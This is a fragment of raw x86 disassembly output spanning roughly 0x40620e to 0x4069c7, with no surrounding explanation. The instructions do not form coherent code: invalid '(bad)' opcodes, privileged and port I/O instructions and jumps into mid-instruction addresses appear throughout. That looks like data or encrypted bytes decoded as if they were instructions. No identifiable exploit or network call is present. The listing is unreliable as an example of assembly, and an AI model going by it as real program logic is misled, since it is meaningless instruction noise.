  40620e:	stos   DWORD PTR es:[edi],eax
  40620f:	jecxz  0x406286
  406211:	dec    edi
  406212:	dec    eax
  406213:	mov    dl,0x29
  406215:	mov    ds:0x46e50c3f,al
  40621a:	(bad)  
  40621b:	inc    esi
  40621c:	stos   BYTE PTR es:[edi],al
  40621d:	dec    esi
  40621e:	inc    esp
  40621f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406220:	push   ebp
  406221:	push   0xffffff8b
  406223:	jne    0x40626d
  406225:	adc    ebp,DWORD PTR [edi+0x155623cb]
  40622b:	cdq    
  40622c:	xor    bl,al
  40622e:	or     bl,BYTE PTR [esi-0x62]
  406231:	ja     0x406200
  406233:	or     DWORD PTR [edx-0x4da8d896],edx
  406239:	stos   BYTE PTR es:[edi],al
  40623a:	xor    eax,0x63853f38
  40623f:	(bad)  
  406241:	push   0xffffffec
  406243:	push   0xc8cf2944
  406248:	outs   dx,BYTE PTR ds:[esi]
  406249:	sbb    BYTE PTR [esi+ecx*1],dl
  40624c:	mov    dl,0x30
  40624e:	test   eax,0xa00069d0
  406253:	rol    esp,1
  406255:	push   eax
  406256:	adc    eax,0x6b627e0
  40625b:	lds    esi,FWORD PTR [eax+ecx*8-0x12f4724a]
  406262:	jns    0x40628c
  406264:	push   cx
  406266:	pop    ebp
  406267:	repz repz mov ebp,0x42f4fa1c
  40626e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40626f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406270:	fistp  WORD PTR [ebp+eiz*8-0x1d]
  406274:	fistp  DWORD PTR [ebp-0x6e]
  406277:	adc    esp,DWORD PTR [ecx-0x68]
  40627a:	mov    ebp,0x34720e19
  40627f:	ss jns 0x40628b
  406282:	loop   0x40624a
  406284:	push   edi
  406285:	or     DWORD PTR ds:0x3eb24679,edi
  40628b:	lea    edx,[ecx-0x44aaf046]
  406291:	outs   dx,BYTE PTR ds:[esi]
  406292:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406293:	daa    
  406294:	(bad)  
  406295:	pusha  
  406296:	popf   
  406297:	cwde   
  406298:	aad    0x4c
  40629a:	add    eax,0xee2d4fff
  40629f:	or     DWORD PTR [ebx-0x538d3e7f],0x53
  4062a6:	pop    ds
  4062a7:	jns    0x406280
  4062a9:	mov    ebx,0x1543d039
  4062ae:	cli    
  4062af:	mov    dh,0xe4
  4062b1:	cs mov eax,0xf7e8dd39
  4062b7:	and    BYTE PTR [edi],ch
  4062b9:	retf   0xf12a
  4062bc:	and    esi,DWORD PTR [edi+eiz*4+0x67]
  4062c0:	int    0xed
  4062c2:	(bad)  
  4062c3:	ds aaa 
  4062c5:	mov    esp,0xfb464d8d
  4062ca:	sub    ebx,DWORD PTR es:[esi-0x4b050e42]
  4062d1:	(bad)  
  4062d2:	push   edi
  4062d3:	xchg   ecx,eax
  4062d4:	xchg   ebp,eax
  4062d5:	pop    edi
  4062d6:	vpmacsdqh ymm6,ymm5,ymm2,YMMWORD PTR [edx-0x790967d4]
  4062e0:	sbb    cl,BYTE PTR [ebp-0x102cc2e6]
  4062e6:	test   ah,bl
  4062e8:	out    0x7f,al
  4062ea:	rcr    DWORD PTR [ebx+ebp*8+0x3f331688],cl
  4062f1:	sub    al,0x32
  4062f3:	and    eax,0x23ea8a5d
  4062f8:	add    dh,dl
  4062fa:	das    
  4062fb:	adc    DWORD PTR [ebp+0x94efdbb],eax
  406301:	add    bl,BYTE PTR [edi+0x59]
  406304:	xor    eax,0xb9fc062f
  406309:	jge    0x4062a9
  40630b:	ins    BYTE PTR es:[edi],dx
  40630c:	sub    eax,0x10dbd667
  406311:	lods   eax,DWORD PTR ds:[esi]
  406312:	(bad)  
  406313:	xchg   esp,eax
  406314:	out    0x29,al
  406316:	mov    ebp,0xbbdcd998
  40631b:	mov    ah,0xe6
  40631d:	data16 das 
  40631f:	rcl    DWORD PTR [eax],0x81
  406322:	xchg   BYTE PTR [edi+0x49db10c5],ah
  406328:	sahf   
  406329:	scas   al,BYTE PTR es:[edi]
  40632a:	mov    ds,WORD PTR [eax]
  40632c:	(bad)  
  40632d:	addr16 mov edx,0xbd554d2d
  406333:	pushf  
  406334:	std    
  406335:	add    dl,ah
  406337:	out    dx,eax
  406338:	mov    dh,0xbc
  40633a:	rcl    DWORD PTR [ecx],0x77
  40633d:	ss dec eax
  40633f:	jmp    0x4062c8
  406341:	push   edx
  406342:	sbb    edx,esp
  406344:	xor    ch,BYTE PTR [edx-0x11]
  406347:	xchg   ebx,eax
  406348:	dec    edi
  406349:	xchg   DWORD PTR [ebx+ebp*2-0x380b0ac9],ebx
  406350:	loope  0x4063a0
  406352:	mov    ebp,0x589d773e
  406357:	mov    al,0xf2
  406359:	add    DWORD PTR [ebx+0x37],ecx
  40635c:	pusha  
  40635d:	jo     0x4062e5
  40635f:	stc    
  406360:	and    DWORD PTR ds:0xd8a17d97,esi
  406366:	ins    BYTE PTR es:[edi],dx
  406367:	repnz mov esp,0x9f28ca7f
  40636d:	jno    0x4063b7
  40636f:	xor    al,bh
  406371:	add    edi,DWORD PTR [eax-0x67]
  406374:	adc    dl,bh
  406376:	fiadd  WORD PTR [ebx-0x78]
  406379:	push   ss
  40637a:	dec    eax
  40637b:	sub    al,0xac
  40637d:	cmp    al,0x6
  40637f:	cs dec edi
  406382:	daa    
  406383:	repz sub ch,BYTE PTR [edi]
  406386:	into   
  406387:	cmp    dh,ch
  406389:	pop    edx
  40638a:	or     al,0x81
  40638c:	sar    BYTE PTR [ecx+edx*8+0x7],0x27
  406391:	jnp    0x406343
  406393:	push   esp
  406394:	fmul   st(7),st
  406396:	jne    0x4063db
  406398:	fidiv  WORD PTR [esp+eiz*2+0x1c]
  40639c:	nop
  40639d:	and    ebx,DWORD PTR [edx]
  40639f:	add    ebp,DWORD PTR [ecx-0x45]
  4063a2:	lds    esi,FWORD PTR [esi-0x73ca192d]
  4063a8:	adc    BYTE PTR [edi+esi*1],ch
  4063ab:	loopne 0x40638f
  4063ad:	mov    bh,0x44
  4063af:	cmc    
  4063b0:	push   edi
  4063b1:	sub    dh,0xbc
  4063b4:	and    eax,0xc581fd9b
  4063b9:	mov    bh,0x7c
  4063bb:	shl    cl,cl
  4063bd:	or     al,0x63
  4063bf:	adc    BYTE PTR [ebp+edx*1-0xc3b8d03],ah
  4063c6:	push   ss
  4063c7:	mov    BYTE PTR [ebp+0x48],ah
  4063ca:	imul   BYTE PTR [esi-0x17]
  4063cd:	fnsave [esi+ecx*2-0x8aff2e]
  4063d4:	stos   BYTE PTR es:[edi],al
  4063d5:	outs   dx,DWORD PTR ds:[esi]
  4063d6:	push   eax
  4063d7:	xor    al,0x42
  4063d9:	xchg   ecx,eax
  4063da:	shl    DWORD PTR [esi],1
  4063dc:	xchg   esi,eax
  4063dd:	inc    esi
  4063de:	fs or  al,0x58
  4063e1:	pop    esi
  4063e2:	pop    esi
  4063e3:	lds    ecx,FWORD PTR [ecx+0x59]
  4063e6:	or     BYTE PTR ds:0x62963d75,dl
  4063ec:	sub    ebp,DWORD PTR [eax-0x1d]
  4063ef:	ins    DWORD PTR es:[edi],dx
  4063f0:	iret   
  4063f1:	nop
  4063f2:	dec    esp
  4063f3:	nop
  4063f4:	fld    DWORD PTR [ebp+ebp*4-0x72]
  4063f8:	sbb    eax,DWORD PTR [ebx-0x301d1738]
  4063fe:	sbb    edi,ebp
  406400:	arpl   WORD PTR [ecx+0x5f],si
  406403:	sub    DWORD PTR [ecx],edx
  406405:	clc    
  406406:	data16 jmp 0x4063aa
  406409:	mov    eax,0xf30104b0
  40640e:	(bad)  
  40640f:	(bad)  
  406410:	cmp    ebx,DWORD PTR [edx+0x5dce61de]
  406416:	pop    eax
  406417:	outs   dx,DWORD PTR ds:[esi]
  406418:	test   DWORD PTR [edx],eax
  40641a:	fucomi st,st(4)
  40641c:	mov    cl,0x89
  40641e:	hlt    
  40641f:	mov    eax,ds:0x3c8869b6
  406424:	pop    eax
  406425:	repnz push ebx
  406427:	das    
  406428:	pusha  
  406429:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40642a:	or     dl,BYTE PTR [edx+0x4c]
  40642d:	mov    eax,ds:0xe87a7f87
  406432:	test   eax,0xcf34285c
  406437:	mov    ebx,0x8b30d7dd
  40643c:	mov    eax,ds:0x89c9a339
  406441:	les    edi,FWORD PTR [ebx]
  406443:	lea    ebx,[ebx+ebx*2]
  406446:	jg     0x4064c1
  406448:	cli    
  406449:	push   edx
  40644a:	fild   QWORD PTR [edx-0x7e51f1e4]
  406450:	jbe    0x406485
  406452:	test   eax,0x6abcf758
  406457:	mov    ecx,0x9f2f9c37
  40645c:	test   esp,ebx
  40645e:	adc    bl,dl
  406460:	retf   
  406461:	test   edi,ebp
  406463:	or     eax,0x66db1e55
  406468:	psubw  mm3,QWORD PTR [esi+0x6e222d3b]
  40646f:	xor    eax,0x77f82759
  406474:	dec    bx
  406476:	mov    cl,0xb8
  406478:	push   0xffffffd2
  40647a:	lahf   
  40647b:	imul   edx,DWORD PTR [ecx+0x73],0x8ec8febd
  406482:	sbb    esp,DWORD PTR ds:0xda53a2e2
  406488:	push   cs
  406489:	popf   
  40648a:	push   edx
  40648b:	stc    
  40648c:	xchg   edx,eax
  40648d:	std    
  40648e:	mov    bh,0x89
  406490:	rol    dh,1
  406492:	lods   eax,DWORD PTR ds:[esi]
  406493:	or     BYTE PTR [ebp+0xd],0x65
  406497:	sub    DWORD PTR [ecx],ecx
  406499:	retf   
  40649a:	pusha  
  40649b:	push   ss
  40649c:	(bad)  
  40649d:	cmp    ecx,DWORD PTR [edi-0x6c]
  4064a0:	cmp    eax,0xe7874125
  4064a5:	jo     0x406479
  4064a7:	mov    edi,DWORD PTR [edx+0x204e93c8]
  4064ad:	out    0x30,eax
  4064af:	pop    eax
  4064b0:	(bad)  
  4064b2:	jg     0x406441
  4064b4:	sbb    BYTE PTR [eax-0x70],ch
  4064b7:	ret    0xca53
  4064ba:	pop    edi
  4064bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064bc:	add    eax,0xc71a6ad9
  4064c1:	popf   
  4064c2:	pushf  
  4064c3:	inc    ecx
  4064c4:	xchg   edx,eax
  4064c5:	iret   
  4064c6:	int    0x3a
  4064c8:	rol    DWORD PTR [ebx-0x78cf9cbb],1
  4064ce:	inc    esi
  4064cf:	out    0x8a,eax
  4064d1:	dec    edi
  4064d2:	stos   DWORD PTR es:[edi],eax
  4064d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064d4:	inc    eax
  4064d5:	xor    eax,0xeabd21b0
  4064da:	cmc    
  4064db:	xlat   BYTE PTR ds:[ebx]
  4064dc:	ds cmp al,0x40
  4064df:	lods   al,BYTE PTR ds:[esi]
  4064e0:	stos   BYTE PTR es:[edi],al
  4064e1:	pop    esp
  4064e2:	jb     0x40655b
  4064e4:	cmp    ebp,DWORD PTR [eax+0x3]
  4064e7:	or     eax,ecx
  4064e9:	fisttp DWORD PTR [ebx]
  4064eb:	clc    
  4064ec:	enter  0x8b0a,0xde
  4064f0:	ret    
  4064f1:	rcr    ecx,cl
  4064f3:	ds pop edi
  4064f5:	loop   0x406534
  4064f7:	add    dl,BYTE PTR [edx-0x667e755e]
  4064fd:	cmp    esi,DWORD PTR [ecx-0xb34358b]
  406503:	loope  0x406508
  406505:	stos   DWORD PTR es:[edi],eax
  406506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406507:	cwde   
  406508:	jg     0x4064e3
  40650a:	jo     0x4064a3
  40650c:	scas   eax,DWORD PTR es:[edi]
  40650d:	and    eax,0xa793ec5d
  406512:	dec    ebp
  406513:	gs repz mov dl,al
  406517:	jl     0x4064f7
  406519:	push   cs
  40651a:	aas    
  40651b:	in     al,dx
  40651c:	lahf   
  40651d:	jb     0x406588
  40651f:	push   ss
  406520:	mov    bl,0xb2
  406522:	or     DWORD PTR [eax],ecx
  406524:	popa   
  406525:	data16 aam 0x19
  406528:	fstp   QWORD PTR ss:[edx+edi*4]
  40652c:	cs mov dl,0x66
  40652f:	mov    BYTE PTR [ebp+0x4a13afeb],ah
  406535:	js     0x40650a
  406537:	push   es
  406538:	sub    eax,0xd0734426
  40653d:	inc    esp
  40653e:	xor    BYTE PTR [eax],dl
  406540:	jne    0x406561
  406542:	hlt    
  406543:	sub    ebp,edx
  406545:	sub    eax,0x6037eaec
  40654a:	or     esp,esp
  40654c:	adc    al,0xc5
  40654e:	ficomp WORD PTR [esi-0x2148902c]
  406554:	test   al,0x14
  406556:	and    eax,0xedf65c85
  40655b:	add    ch,BYTE PTR [esi]
  40655d:	loopne 0x4064e8
  40655f:	dec    DWORD PTR [edx+0x17bc10a7]
  406565:	and    al,0x65
  406567:	(bad)  
  406568:	lahf   
  406569:	cdq    
  40656a:	cdq    
  40656b:	jp     0x40656c
  40656d:	xchg   ecx,eax
  40656e:	in     al,0x3d
  406570:	cmp    al,0x17
  406572:	push   esi
  406573:	sbb    DWORD PTR [ecx+0x14bd19b6],0x1c
  40657a:	mov    al,0x1
  40657d:	jecxz  0x40651d
  40657f:	ins    BYTE PTR es:[edi],dx
  406580:	mov    al,ds:0x768689b5
  406585:	lock sub BYTE PTR [ecx],al
  406588:	dec    esp
  406589:	cs cmp al,0xf4
  40658c:	fimul  DWORD PTR [eax-0x1c2e757a]
  406592:	push   es
  406593:	xchg   esi,eax
  406594:	and    BYTE PTR [ecx],ah
  406596:	arpl   WORD PTR [esi-0x7],di
  406599:	ja     0x40654b
  40659b:	arpl   WORD PTR [ecx-0x73e02d8e],dx
  4065a1:	hlt    
  4065a2:	pop    esi
  4065a3:	inc    DWORD PTR [ebx+0x28]
  4065a6:	inc    eax
  4065a7:	imul   DWORD PTR [ebx+0x60]
  4065aa:	sbb    eax,DWORD PTR [eax]
  4065ac:	inc    ecx
  4065ad:	dec    ecx
  4065ae:	loopne 0x4065ee
  4065b0:	cmc    
  4065b1:	push   ebx
  4065b2:	inc    edx
  4065b3:	jb     0x406595
  4065b5:	aas    
  4065b6:	and    DWORD PTR [eax],eax
  4065b8:	loop   0x406594
  4065ba:	test   DWORD PTR [edi-0x43],esp
  4065bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065be:	mov    ecx,0x4e5129f
  4065c3:	and    BYTE PTR [eax-0x5e],ah
  4065c6:	xchg   esp,eax
  4065c7:	inc    eax
  4065c8:	repnz gs dec esp
  4065cb:	fidiv  DWORD PTR [ecx-0x1a]
  4065ce:	jge    0x4065c8
  4065d0:	push   0x55
  4065d2:	or     al,0xd8
  4065d4:	add    BYTE PTR [ebx],0xe5
  4065d7:	pushf  
  4065d8:	xor    al,0xd6
  4065da:	jae    0x406574
  4065dc:	pop    es
  4065dd:	sbb    BYTE PTR [esi+0x43],cl
  4065e0:	dec    ebx
  4065e1:	shl    ah,1
  4065e3:	jmp    0xc863f19b
  4065e8:	sti    
  4065e9:	fisubr WORD PTR [edi+0x54]
  4065ec:	push   eax
  4065ed:	shr    DWORD PTR [edi+0x10f05677],0x98
  4065f4:	adc    eax,0xe69536
  4065f9:	lods   al,BYTE PTR ds:[esi]
  4065fa:	sbb    edx,edi
  4065fc:	test   eax,0x9dcb355d
  406601:	mov    cl,0x62
  406603:	xchg   ecx,eax
  406604:	jp     0x406678
  406606:	int3   
  406607:	pop    edx
  406608:	test   BYTE PTR [edi+0x13e44e75],ch
  40660e:	mov    ecx,0x45b19b3
  406613:	mov    edx,0xb5dd8dfd
  406618:	sti    
  406619:	mov    bh,0x4d
  40661b:	and    ah,BYTE PTR [eax+0x56c8a647]
  406621:	pop    esp
  406622:	mov    ds:0x606dcfa7,al
  406627:	mov    esp,0x2032acc
  40662c:	sub    al,0x68
  40662e:	lock les ecx,FWORD PTR [eax-0x29]
  406632:	(bad)  
  406633:	out    dx,al
  406634:	fldcw  WORD PTR [ecx]
  406636:	mov    dl,0x3e
  406638:	cmp    al,0xaf
  40663a:	nop
  40663b:	inc    esi
  40663c:	xchg   ecx,eax
  40663d:	xchg   esp,eax
  40663e:	xchg   edx,eax
  40663f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406640:	inc    edi
  406641:	cmovno ecx,DWORD PTR [ecx-0x2b]
  406645:	shl    DWORD PTR [edi-0x15],1
  406648:	in     eax,dx
  406649:	xchg   BYTE PTR [edi+edi*8+0x97d02d1],al
  406650:	xlat   BYTE PTR ds:[ebx]
  406651:	test   BYTE PTR [ebp-0x1c],0x24
  406655:	jmpw   0x329e
  406659:	jle    0x406619
  40665b:	sti    
  40665c:	jmp    0x97aa5f61
  406661:	or     bh,BYTE PTR [eax-0x31]
  406664:	push   ds
  406665:	pop    edi
  406666:	and    dh,al
  406668:	ds dec ecx
  40666a:	jmp    0x406632
  40666c:	shl    DWORD PTR [ebx],1
  40666e:	lahf   
  40666f:	aam    0x81
  406671:	mov    al,ds:0x6a08de1c
  406676:	mov    eax,0x82a7f555
  40667b:	ret    
  40667c:	dec    ecx
  40667d:	jae    0x406657
  40667f:	sahf   
  406680:	icebp  
  406681:	fnstcw WORD PTR [esi]
  406683:	popa   
  406684:	or     eax,0x41ce6284
  406689:	cmovb  edx,DWORD PTR [ebp-0x26f4a441]
  406690:	mov    al,0x5a
  406692:	sbb    esp,DWORD PTR [esi+esi*4-0x29c2aaed]
  406699:	retf   
  40669a:	in     eax,dx
  40669b:	jmp    0x406687
  40669d:	add    BYTE PTR [esi+0x29aac681],dh
  4066a3:	fild   DWORD PTR [ebx+0x5395911]
  4066aa:	loopne 0x406697
  4066ac:	(bad)  
  4066ad:	dec    edi
  4066ae:	(bad)  
  4066af:	fucomp st(0)
  4066b1:	(bad)  
  4066b2:	dec    esp
  4066b3:	or     DWORD PTR [edx-0x3d],ebp
  4066b6:	mov    esi,0x3ab4798d
  4066bb:	xchg   esp,eax
  4066bc:	jno    0x406656
  4066be:	pop    ebx
  4066bf:	mov    edi,0x28a056b5
  4066c4:	add    al,0x5e
  4066c6:	(bad)  
  4066c7:	aam    0x9f
  4066c9:	dec    ebx
  4066ca:	test   al,0x44
  4066cc:	xchg   DWORD PTR [edi+0x63],edi
  4066cf:	pop    esi
  4066d0:	jo     0x4066a4
  4066d2:	fimul  WORD PTR [ebp+0x2c064812]
  4066d8:	mov    dh,0xe8
  4066da:	pop    ebp
  4066db:	and    ch,dh
  4066dd:	sbb    eax,DWORD PTR [esi+ebx*8+0xf]
  4066e1:	(bad)  
  4066e2:	push   ss
  4066e3:	cmp    esp,ebp
  4066e5:	daa    
  4066e6:	dec    esp
  4066e7:	enter  0x999c,0x13
  4066eb:	outs   dx,DWORD PTR ds:[esi]
  4066ec:	sbb    al,0xb2
  4066ee:	ins    DWORD PTR es:[edi],dx
  4066ef:	pop    esi
  4066f0:	jnp    0x40669f
  4066f2:	ins    BYTE PTR es:[edi],dx
  4066f3:	jecxz  0x4066c9
  4066f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066f6:	xchg   BYTE PTR [ecx-0x21],bl
  4066f9:	(bad)  
  4066fa:	push   ds
  4066fb:	dec    esp
  4066fc:	sti    
  4066fd:	push   ebp
  4066fe:	xchg   ebx,eax
  4066ff:	test   eax,0x742ee3a7
  406704:	sbb    al,0x80
  406706:	xchg   ebp,eax
  406707:	mov    al,0x10
  406709:	in     al,0x81
  40670b:	(bad)  
  40670c:	arpl   WORD PTR [edx+0x4946eb87],dx
  406712:	dec    edx
  406713:	bound  ebx,QWORD PTR [ecx]
  406715:	cwde   
  406716:	mov    edi,0xd6b58970
  40671b:	pop    ss
  40671c:	test   DWORD PTR [edi+ecx*4+0x20],eax
  406720:	xor    esi,DWORD PTR [eax-0x67]
  406723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406724:	cmp    esi,ebp
  406726:	mov    DWORD PTR [ebx+0x6b240dc7],edi
  40672c:	seta   BYTE PTR [eax]
  40672f:	add    BYTE PTR [ebx],bh
  406731:	js     0x4066f5
  406733:	adc    edx,DWORD PTR [eax-0x551df48f]
  406739:	imul   esi,ebx,0x3a
  40673c:	dec    ebx
  40673d:	push   ds
  40673e:	out    0x4,eax
  406740:	(bad)  
  406741:	ror    DWORD PTR [ecx],1
  406743:	inc    edi
  406744:	sbb    al,0x7a
  406746:	adc    ch,dl
  406748:	fwait
  406749:	popf   
  40674a:	sbb    al,0x2
  40674c:	xchg   esp,eax
  40674d:	or     dl,BYTE PTR [eax]
  40674f:	mov    ds:0x9f8b7395,al
  406754:	mov    ds:0x70eaad9d,eax
  406759:	pushf  
  40675a:	ret    0x1429
  40675d:	je     0x4066e8
  40675f:	les    ebp,FWORD PTR [esi-0x49faa373]
  406765:	call   0xf88cb3b7
  40676a:	dec    esi
  40676b:	push   0x4c6242d0
  406770:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406771:	pop    esi
  406772:	xchg   ebx,eax
  406773:	dec    eax
  406774:	dec    edx
  406775:	(bad)  
  406776:	sub    al,0xcb
  406778:	outs   dx,BYTE PTR ds:[esi]
  406779:	xchg   esp,eax
  40677a:	mov    ds:0x22891f16,eax
  40677f:	mov    eax,ds:0xec814705
  406784:	or     eax,0xed628098
  406789:	pop    esi
  40678a:	adc    bl,BYTE PTR [edi]
  40678c:	cmp    al,0xe3
  40678e:	test   DWORD PTR ss:[edx+edi*1],esi
  406792:	fwait
  406793:	cmp    bl,dl
  406795:	inc    ebp
  406796:	icebp  
  406797:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406798:	jmp    esi
  40679a:	inc    eax
  40679b:	add    ah,BYTE PTR [ebp+0x68]
  40679e:	mov    ebx,0xf6d6825e
  4067a3:	mov    ah,0xbc
  4067a5:	cmp    al,0xb3
  4067a7:	push   esi
  4067a8:	push   edx
  4067a9:	xor    BYTE PTR [ebp+0x6e02adb3],bl
  4067af:	(bad)  [eax+ebx*1-0x768cc62c]
  4067b6:	cwde   
  4067b7:	mov    al,ds:0x4776a9a2
  4067bc:	cmp    esi,DWORD PTR [edx-0x18]
  4067bf:	jle    0x4067ea
  4067c1:	aad    0x8f
  4067c3:	sub    BYTE PTR [edi+0x1a],0x2
  4067c7:	stc    
  4067c8:	(bad)  
  4067c9:	fsub   DWORD PTR [eax]
  4067cb:	hlt    
  4067cc:	sbb    BYTE PTR [esi-0x4a49f198],bl
  4067d2:	fwait
  4067d3:	pop    esi
  4067d4:	jb     0x4067dc
  4067d6:	repnz sbb BYTE PTR [ebx-0x6],ch
  4067da:	aaa    
  4067db:	push   ecx
  4067dc:	mov    bh,0xd9
  4067de:	jb     0x4067a4
  4067e0:	xchg   esi,eax
  4067e1:	inc    ebp
  4067e2:	push   ebp
  4067e3:	int    0x79
  4067e5:	enter  0x16b0,0x7
  4067e9:	xor    edi,DWORD PTR [ecx+0x2c21826c]
  4067ef:	pop    eax
  4067f0:	xor    edx,DWORD PTR [edx]
  4067f2:	jg     0x406840
  4067f4:	sbb    al,0x4b
  4067f6:	mov    ebp,DWORD PTR [eax]
  4067f8:	ja     0x406835
  4067fa:	lds    eax,FWORD PTR ds:0xf6370744
  406800:	xchg   ebx,eax
  406801:	mov    ah,0x56
  406803:	jne    0x4067c7
  406805:	xor    DWORD PTR [edi+0x586a945a],esi
  40680b:	add    ah,cl
  40680d:	pop    es
  40680e:	dec    edi
  406810:	jmp    0x406805
  406812:	or     al,BYTE PTR [eax]
  406814:	inc    ebx
  406815:	ins    DWORD PTR es:[edi],dx
  406816:	dec    edx
  406817:	mov    esi,0xa2da97f
  40681c:	mov    al,ds:0xd44859c4
  406821:	ja     0x40684a
  406823:	(bad)  
  406824:	repz cmp eax,0x70171d34
  40682a:	dec    ebp
  40682b:	cdq    
  40682c:	ficom  DWORD PTR [edi-0x4]
  40682f:	test   ecx,edi
  406831:	and    al,0xc8
  406833:	mov    ebp,0xcdb273bb
  406838:	mov    ch,0xca
  40683a:	aas    
  40683b:	dec    ebx
  40683c:	mov    ah,0xac
  40683e:	loope  0x406866
  406840:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406841:	gs ret 0xa25b
  406845:	in     eax,dx
  406846:	test   DWORD PTR [ecx-0x30c45c1e],edx
  40684c:	scas   al,BYTE PTR es:[edi]
  40684d:	jg     0x4067d5
  40684f:	jecxz  0x40688b
  406851:	pop    esi
  406852:	jg     0x406815
  406854:	dec    ebx
  406855:	cmp    esi,DWORD PTR [ebp-0xc]
  406858:	and    BYTE PTR [esi+0x33],0x4a
  40685c:	sbb    BYTE PTR [eax],ch
  40685e:	cmp    ebp,DWORD PTR [ebp-0x5b3fc0bd]
  406864:	je     0x40685e
  406866:	ins    DWORD PTR es:[edi],dx
  406867:	test   eax,0xf5c0b4a9
  40686c:	jle    0x406893
  40686e:	dec    esp
  40686f:	aaa    
  406870:	push   edx
  406871:	add    DWORD PTR [ecx-0x26157a10],edx
  406877:	mov    cl,0x47
  406879:	and    DWORD PTR [eax],ebx
  40687b:	sbb    eax,0xd99a869e
  406880:	pop    edx
  406881:	cwde   
  406882:	sbb    al,0x82
  406884:	repnz ins DWORD PTR es:[edi],dx
  406886:	xchg   ebx,eax
  406887:	(bad)  
  406888:	jmp    0x40686e
  40688a:	xlat   BYTE PTR ds:[ebx]
  40688b:	and    DWORD PTR [eax-0x7a],esi
  40688e:	add    al,0x45
  406890:	mov    esp,0xcbfcc5bb
  406895:	cmp    bh,al
  406897:	ret    
  406898:	jbe    0x4068aa
  40689a:	pop    ebp
  40689b:	xor    eax,0x44508aea
  4068a0:	jb     0x4068bd
  4068a2:	mov    ds,WORD PTR [ebp-0x78480f53]
  4068a8:	push   ds
  4068a9:	retf   
  4068aa:	fist   WORD PTR [ebx+0x72]
  4068ad:	jge    0x4068c8
  4068af:	jle    0x406923
  4068b1:	(bad)  
  4068b3:	mov    eax,0x2a10c6f2
  4068b8:	mov    esi,0x1980b65c
  4068bd:	test   al,ch
  4068bf:	xor    ebx,DWORD PTR [bx+di-0x583f]
  4068c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068c5:	retf   0xdee2
  4068c8:	xor    DWORD PTR [eax+eiz*2-0x1b08b615],edi
  4068cf:	adc    al,BYTE PTR [edx+ebx*8+0x76dad7fc]
  4068d6:	jle    0x4068ee
  4068d8:	jno    0x4068fe
  4068da:	mov    bh,0xae
  4068dc:	xor    eax,0x139874cc
  4068e1:	int3   
  4068e2:	dec    edi
  4068e3:	xchg   ebx,eax
  4068e4:	lahf   
  4068e5:	sbb    edi,DWORD PTR [edi-0x2e]
  4068e8:	xor    eax,0x2eb6f76
  4068ee:	cmc    
  4068ef:	ds imul eax,ebx,0xffffffd5
  4068f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068f4:	and    bh,BYTE PTR [edx+0x1d719011]
  4068fa:	jg     0x406958
  4068fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068fd:	inc    esi
  4068fe:	mov    ecx,0xb25ff3f2
  406903:	mov    eax,ds:0xd09156ab
  406908:	xor    bl,BYTE PTR [eax-0x59d7380b]
  40690e:	mov    edx,0xf8b3cfb1
  406913:	fild   WORD PTR [ecx]
  406915:	fsubr  DWORD PTR [eax]
  406917:	test   al,0x96
  406919:	push   edx
  40691a:	sub    DWORD PTR [eax-0x4f],edx
  40691d:	lock push cs
  40691f:	dec    edi
  406920:	shr    DWORD PTR ds:0xf08b3344,0x2
  406927:	pop    ss
  406928:	mov    ebp,0xd1b0476c
  40692d:	and    esp,DWORD PTR [ebx+0x767ef7d8]
  406933:	jae    0x40696c
  406935:	ins    DWORD PTR es:[edi],dx
  406936:	cmp    esi,DWORD PTR [ecx+0x2e]
  406939:	xlat   BYTE PTR ds:[ebx]
  40693a:	add    eax,0xe3696c17
  40693f:	adc    al,BYTE PTR [ebx+0x3e]
  406942:	adc    DWORD PTR [edx],ebp
  406944:	leave  
  406945:	arpl   di,bp
  406947:	mov    ebx,0x6055f5de
  40694c:	sbb    BYTE PTR [edi+0x58],ch
  40694f:	mov    ch,0xd2
  406951:	popa   
  406952:	aam    0x61
  406954:	imul   edi,eax,0x10
  406957:	add    BYTE PTR [eax],0x95
  40695a:	push   ebx
  40695b:	scas   al,BYTE PTR es:[edi]
  40695c:	mov    ds:0x3203cd6d,al
  406961:	add    dh,cl
  406963:	in     al,0xf7
  406965:	xor    BYTE PTR [ecx-0x77],cl
  406968:	cmp    al,bl
  40696a:	add    dl,dl
  40696c:	ficomp DWORD PTR [esi+0x4d]
  40696f:	add    al,0xef
  406971:	xor    al,0x94
  406973:	and    edx,ebp
  406975:	lds    ebp,FWORD PTR [esi-0x21]
  406978:	rcl    esi,cl
  40697a:	dec    DWORD PTR [ebx-0x1fb64611]
  406980:	sahf   
  406981:	sub    eax,0xec5ec472
  406986:	add    eax,0x1ead400f
  40698b:	(bad)  
  40698c:	mov    esp,0x91d3ad2f
  406991:	test   ah,0x1e
  406994:	xchg   ebp,eax
  406995:	inc    ebx
  406996:	lods   eax,DWORD PTR ds:[esi]
  406997:	aam    0x80
  406999:	in     eax,dx
  40699a:	mov    esi,0x3c10fe71
  40699f:	jecxz  0x406997
  4069a1:	mov    al,ds:0xd68fe1a8
  4069a6:	sbb    dl,bl
  4069a8:	and    esp,DWORD PTR [eax]
  4069aa:	or     dl,BYTE PTR [ecx-0xb8f4c7]
  4069b0:	xor    eax,0xed864ba6
  4069b5:	xchg   ebp,eax
  4069b6:	dec    eax
  4069b7:	inc    esi
  4069b8:	or     BYTE PTR [esi],0x9e
  4069bb:	enter  0xf34,0xd6
  4069bf:	rcr    DWORD PTR [ebp-0x7e5eea80],1
  4069c5:	add    al,0x22
  4069c7:	daa    
